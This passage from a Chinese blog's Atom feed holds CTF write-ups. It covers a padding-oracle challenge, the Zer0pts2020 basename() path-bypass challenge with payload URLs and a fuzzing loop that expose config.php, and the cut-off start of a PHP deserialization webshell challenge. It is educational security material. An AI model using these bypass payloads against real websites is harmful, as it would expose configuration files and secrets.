<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Manayakko - 微笑才是王道</title>
  
  <subtitle>越努力，越幸运</subtitle>
  <link href="/yakko117/atom.xml" rel="self"/>
  
  <link href="https://manayakko.github.io/yakko117/"/>
  <updated>2022-01-03T08:45:28.457Z</updated>
  <id>https://manayakko.github.io/yakko117/</id>
  
  <author>
    <name>Manayakko</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BuuctfDay9</title>
    <link href="https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/"/>
    <id>https://manayakko.github.io/yakko117/2022/01/03/buuctfDay09/</id>
    <published>2022-01-03T04:15:43.394Z</published>
    <updated>2022-01-03T08:45:28.457Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>很久没更新了，因为各种原因摸了一年多的鱼</p><h1 id="NPUCTF2020-web🐕"><a href="#NPUCTF2020-web🐕" class="headerlink" title="[NPUCTF2020] web🐕"></a>[NPUCTF2020] web🐕</h1><p>首先先看一下题目</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">我摊牌了，就是懒得写前端</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h2><ul><li>PHP AES 加密</li><li>CBC字节翻转攻击 <a href="https://www.smi1e.top/cbc%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E5%92%8Cpadding-oracle/" target="_blank" rel="noopener">微笑师傅的分析讲解</a> 以及 <a href="https://wooyun.js.org/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html" target="_blank" rel="noopener">wooyun的技术分析帖</a></li><li>还有这篇 <a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">Padding Oracle攻击的分析和思考（详细）</a></li></ul><p>程序是 <code>128位的cbc</code>，<code>blocksize是16字节</code>，加密 <code>IV</code> 已知，<code>secret</code> 未知<br>但是可以知道解密是否成功，而且可以控制密文和解密的 <code>IV</code><br>可以使用 <code>padding oracle</code> 爆出明文</p><p>主要原理是根据 <code>cbc</code> 在 <code>IV padding</code> 正确的情况下的返回值和 <code>padding</code> 错误下的返回值是不一样的，可以利用这个特性逐位还原密文。</p><p>找到个<a href="https://github.com/mpgn/Padding-oracle-attack" target="_blank" rel="noopener">脚本</a></p><p><a href="https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md" target="_blank" rel="noopener">https://github.com/sqxssss/NPUCTF_WriteUps/blob/master/npuctf_wp_by_star.md</a></p><p><a href="http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/" target="_blank" rel="noopener">http://wh1sper.cn/padding-oracle-attackcbc%e5%ad%97%e8%8a%82%e7%bf%bb%e8%bd%ac%e6%94%bb%e5%87%bb/</a></p><p><a href="https://www.jianshu.com/p/7f171477a603" target="_blank" rel="noopener">https://www.jianshu.com/p/7f171477a603</a></p><hr><h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="主要说一下几个关键点"><a href="#主要说一下几个关键点" class="headerlink" title="主要说一下几个关键点"></a>主要说一下几个关键点</h2><p><a href="https://www.php.net/manual/zh/function.hash-equals.php" target="_blank" rel="noopener">hash_equals 函数</a><br><a href="https://www.php.net/manual/zh/function.crypt.php" target="_blank" rel="noopener">crypt 加密函数</a></p><p>在密码学中，时序攻击是一种侧信道攻击，攻击者试图通过分析加密算法的时间执行来推导出密码。每一个逻辑运算在计算机需要时间来执行，根据输入不同，精确测量执行时间，根据执行时间反推出密码。</p><p>如果是用普通的 <code>==</code> 来进行比较，那么两个字符串是从第一位开始逐一进行比较的，发现不同就立即返回 <code>false</code>，那么通过计算返回的速度就知道了大概是哪一位开始不同的，<code>php</code> 中为了应对这种情况，就使用 <code>hash_equals函数</code>。</p><p>示例如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test  = crypt(<span class="string">'114514'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line">$AAA   = crypt(<span class="string">'114514'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line">$BBB = crypt(<span class="string">'manako'</span>, <span class="string">'$2a$07$stringforsalt$'</span>);</span><br><span class="line"></span><br><span class="line">var_dump(hash_equals($test, $AAA));</span><br><span class="line">var_dump(hash_equals($test, $BBB));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>回显</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool(<span class="keyword">true</span>)</span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure></div><p>而将盐值修改为要求的散列类 <code>$2a$07$usesomesillystringforsalt$</code><br>或者去掉bool变量定义，直接将盐值变成 <code>stringforsalt</code> 返回会判定为 <code>false</code></p><p>同时看到一句这样的话:</p><blockquote><p>When the failure string “<em>0” is given as the salt, “</em>1” will now be returned for consistency with other crypt implementations. Prior to this version, PHP 5.6 would incorrectly return a DES hash.</p></blockquote><p>首先来看一下这个加密算法<br><code>crypt</code> 有两个参数：<br>第一个参数：加密字符串<br>第二个参数：盐值字符串 <code>/$str = &#39;123456789&#39;</code>;<br>使用自动盐值 <code>echo&#39;自动 盐值: &#39; . crypt($str) . &quot;\n&quot;;</code><br>如 <code>$1$yvnZHBo0$sBZBd0vzZYnxbtQftQulZ</code></p><hr><h2 id="以不同散列类型使用-crypt"><a href="#以不同散列类型使用-crypt" class="headerlink" title="以不同散列类型使用 crypt()"></a>以不同散列类型使用 crypt()</h2><h3 id="CRYPT-STD-DES-基于标准-DES-算法的散列使用"><a href="#CRYPT-STD-DES-基于标准-DES-算法的散列使用" class="headerlink" title="CRYPT_STD_DES - 基于标准 DES 算法的散列使用"></a>CRYPT_STD_DES - 基于标准 DES 算法的散列使用</h3><p><code>./0-9A-Za-z</code> 字符中的两个字符作为盐值。<br>在盐值中使用非法的字符将导致 <code>crypt()</code> 失败。</p><h3 id="CRYPT-EXT-DES-扩展的基于-DES-算法的散列。"><a href="#CRYPT-EXT-DES-扩展的基于-DES-算法的散列。" class="headerlink" title="CRYPT_EXT_DES - 扩展的基于 DES 算法的散列。"></a>CRYPT_EXT_DES - 扩展的基于 DES 算法的散列。</h3><p>其盐值为 <code>9</code> 个字符的字符串，由 <code>1</code> 个下划线后面跟着 <code>4</code> 字节循环次数和 <code>4</code> 字节盐值组成。<br>它们被编码成可打印字符，每个字符 <code>6</code> 位，有效位最少的优先。<br><code>0</code> 到 <code>63</code> 被编码为 <code>./0-9A-Za-z</code>。</p><h3 id="CRYPT-MD5-MD5-散列"><a href="#CRYPT-MD5-MD5-散列" class="headerlink" title="CRYPT_MD5 - MD5 散列"></a>CRYPT_MD5 - MD5 散列</h3><p>使用一个以 <code>$1$</code> 开始的 <code>12</code> 字符的字符串盐值。</p><h3 id="CRYPT-BLOWFISH-Blowfish-算法"><a href="#CRYPT-BLOWFISH-Blowfish-算法" class="headerlink" title="CRYPT_BLOWFISH - Blowfish 算法"></a>CRYPT_BLOWFISH - Blowfish 算法</h3><p>使用如下盐值：<code>$2a$</code>，一个两位 <code>cost</code> 参数，<code>$</code> 以及 <code>64</code> 位由 <code>./0-9A-Za-z</code> 中的字符组合而成的字符串。<br>在盐值中使用此范围之外的字符将导致 <code>crypt()</code> 返回一个空字符串。<br>两位 <code>cost</code> 参数是循环次数以 <code>2</code> 为底的对数，它的范围是 <code>04-31</code>，超出这个范围将导致 <code>crypt()</code> 失败。</p><p><font color="red">！！！需要注意到一点</font>，盐值要求为 <code>64位</code>，长度不满足就会加密失败，这就是为什么上面的示例使用<code>$2a$07$stringforsalt$</code> 会出现 <code>hash</code> 验证为 <code>true</code>;</p><h3 id="CRYPT-SHA256-SHA512-散列算法"><a href="#CRYPT-SHA256-SHA512-散列算法" class="headerlink" title="CRYPT_SHA256/SHA512 散列算法"></a>CRYPT_SHA256/SHA512 散列算法</h3><p><code>SHA-256</code> 算法使用一个以 <code>$5$</code> 开头的 <code>16</code> 字符字符串盐值进行散列<br>如果盐值字符串以 <code>rounds=$</code> 开头，<code>N</code> 的数字值将被用来指定散列循环的执行次数，这点很像 Blowfish 算法的 <code>cost</code> 参数。默认的循环次数是 <code>5000</code>，最小是 <code>1000</code>，最大是 <code>999,999,999</code>。超出这个范围的 <code>N</code> 将会被转换为最接近的值。</p><p><code>SHA-256</code> 和 <code>SHA-512</code> 同理</p><p>加密示例</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (CRYPT_STD_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Standard DES: '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'rl'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_EXT_DES == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Extended DES: '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'_J9..rasm'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_MD5 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'MD5:          '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$1$rasmusle$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_BLOWFISH == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Blowfish:     '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$2a$07$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA256 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'SHA-256:      '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$5$rounds=5000$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CRYPT_SHA512 == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'SHA-512:      '</span> . crypt(<span class="string">'rasmuslerdorf'</span>, <span class="string">'$6$rounds=5000$usesomesillystringforsalt$'</span>) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><hr><h2 id="回归到解题本身"><a href="#回归到解题本身" class="headerlink" title="回归到解题本身"></a>回归到解题本身</h2><h3 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h3><p>比较两个提交的参数是否相等，则给出flag，<code>random_bytes</code>函数生成适合于加密使用的任意长度的加密随机字节字符串，随后通过<code>bin2hex</code>转换为十六进制值</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="comment">//需要将PHP version 更改为&gt;=7</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> (random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> bin2hex(random_bytes(<span class="number">64</span>)) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h3><p>绕过正则表达式访问开头源码提示flag的config.php</p><p>需要了解的几个东西 <a href="https://www.php.net/basename" target="_blank" rel="noopener">basename函数</a> 以及 <a href="https://bugs.php.net/bug.php?id=62119" target="_blank" rel="noopener">函数漏洞</a><br><a href="https://blog.csdn.net/weixin_42314192/article/details/116257437" target="_blank" rel="noopener">参考思路，PHP里的basename函数不支持中文名的解决</a></p><p>首先先看全局变量 <code>$_SERVER[‘PHP_SELF’]</code> </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[‘PHP_SELF’] 获取当前页面地址</span><br><span class="line">是当前 php 文件相对于网站根目录的位置地址</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.test.com/php/ | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php?test=yakko | /php/index.php</span></span><br><span class="line">http:<span class="comment">//www.test.com/php/index.php/test/yakko | /php/index.php/test/yakko</span></span><br><span class="line"></span><br><span class="line">$_SERVER[‘REQUEST_URI’]完整url地址，包括请求的url参数</span><br><span class="line"></span><br><span class="line">$_SERVER[‘HTTP_HOST’]只有一段的域名,不包括前面的协议和后面的相对位置</span><br></pre></td></tr></table></figure></div><p>访问 <code>/index.php/config.php</code>，经过 <code>basename()</code> 传入 <code>highlight_file()</code> 的文件名就会变成 <code>config.php</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $url1 = <span class="string">"testpath/index.php"</span>;</span><br><span class="line">     <span class="comment">// 返回index.php</span></span><br><span class="line">    </span><br><span class="line">    $url2 = <span class="string">"testpath/index.php"</span>.urldecode(<span class="string">'%D1%A7%CF'</span>); </span><br><span class="line">    <span class="comment">// 返回index.php和乱码</span></span><br><span class="line">    </span><br><span class="line">    $url3 = urldecode(<span class="string">'%D1%A7%CF%B0index.php+ '</span>);</span><br><span class="line">     <span class="comment">// 返回flag，前面的非acsii被删除</span></span><br><span class="line">    </span><br><span class="line">    $url4 = urldecode(<span class="string">'index.php%D1%A7%CF%B0 '</span>); </span><br><span class="line">    <span class="comment">// 返回flag和后面的非ascii</span></span><br><span class="line"><span class="keyword">echo</span> basename($url1) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url2) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url3) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> basename($url4) .<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>Payload1</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://xxx.com/index.php/config.php/任意中文?source</span></span><br></pre></td></tr></table></figure></div><p>以及大佬的fuzz思路</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/config\.php\/*$/i'</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    $str=<span class="string">"/index.php/config.php/"</span>.chr($i);</span><br><span class="line">    <span class="keyword">if</span>(!check($str))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i.<span class="string">"："</span>.basename($str);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Payload2</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://xxx.com/index.php/config.php/%80?source</span></span><br></pre></td></tr></table></figure></div><p>参考很多大佬的思路<br><a href="https://blog.csdn.net/qq_58784379/article/details/121742710" target="_blank" rel="noopener">sGanYu(Zer0pts2020)basename函数漏洞</a><br><a href="https://blog.csdn.net/rfrder/article/details/110929280" target="_blank" rel="noopener">bfengj(Zer0pts2020)Can you guess it?的WP</a></p><hr><h1 id="叨逼几句"><a href="#叨逼几句" class="headerlink" title="叨逼几句"></a>叨逼几句</h1><p>很久没做题了，摸了太久了，的确自己生疏了很多，2021年确实很多事情不怎么顺，希望新的一年能好一些吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Ha1cyonCTF2020-公开赛</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/18/NPUCTF2020/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/18/NPUCTF2020/</id>
    <published>2020-04-18T00:59:02.917Z</published>
    <updated>2020-05-04T02:45:52.618Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>复现学习，还是学习到很多东西的</p><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020] ReadlezPHP"></a>[NPUCTF2020] ReadlezPHP</h1><p>F12 源码看到 <code>/time.php?source</code><br>简单的链子，序列化对象 <code>assert</code> 传马</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span 